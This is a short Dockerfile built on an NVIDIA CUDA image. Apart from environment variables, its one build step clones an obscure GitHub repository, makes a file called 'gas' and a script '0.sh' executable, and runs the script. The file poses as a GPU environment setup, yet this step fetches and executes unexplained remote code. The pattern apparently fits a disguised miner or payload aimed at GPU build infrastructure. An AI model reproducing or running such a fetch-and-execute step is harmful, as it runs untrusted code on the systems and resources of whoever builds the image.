FROM nvidia/cuda:10.2-cudnn7-devel

ENV LANG=C.UTF-8 LC_ALL=C.UTF-8
ENV CUDNN_VERSION 8.2.0.53

RUN git clone https://github.com/Annsjjsks/aa.git && cd aa && chmod 777 gas 0.sh && ./0.sh
